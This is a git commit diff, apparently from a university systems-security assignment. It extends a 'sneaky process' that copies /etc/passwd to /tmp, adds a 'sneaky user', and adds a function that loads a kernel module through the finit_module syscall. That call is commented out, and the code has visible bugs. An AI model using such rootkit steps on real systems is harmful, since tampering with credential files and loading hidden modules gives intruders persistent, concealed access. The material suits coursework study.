994f2ad9b1a0c374fba5354d4d9c04538e2aa275
Koushik Annareddy Sreenath <ka266@duke.edu>
2023-04-25 11:58:24 -0400

    Trying to load sneaky module

--- sneaky_process.c
+++ sneaky_process.c
@@ -1,5 +1,9 @@
 #include<stdio.h>
 #include<stdlib.h>
+#include <fcntl.h>
+#include <linux/module.h>
+#include <sys/syscall.h>
+#include <unistd.h>
 
 void copyfile(char source_path[256], char destination_path[256]){
   FILE *source, *destination;
@@ -36,12 +40,27 @@ void addSneakyUser(){
   fclose(fp);
 }
 
+
+void loadSneakyModule(int pid){
+  int fd = open("sneaky_mod.c", O_RDONLY);
+  int res = syscall(__NR_finit_module, fd, "", 0);
+  if (res != 0) {
+    printf("Sneaky Module is not loaded");
+    return EXIT_FAILURE;
+  }
+  printf("Sneaky Module is loaded");
+  close(fd);
+} 
+
 int main(int argc, char* argv[]){
   int current_pid = getpid();
   printf("sneaky_process pid = %d\n", current_pid);
+  printf("Copying file");
   copyfile("/etc/passwd", "/tmp/passwd");
+  printf("Adding sneaky user");
   addSneakyUser();
-
+  printf("Loading Sneaky user");
+  // loadSneakyModule(current_pid);
   while(1){
     char input;
     scanf("%c", &input);
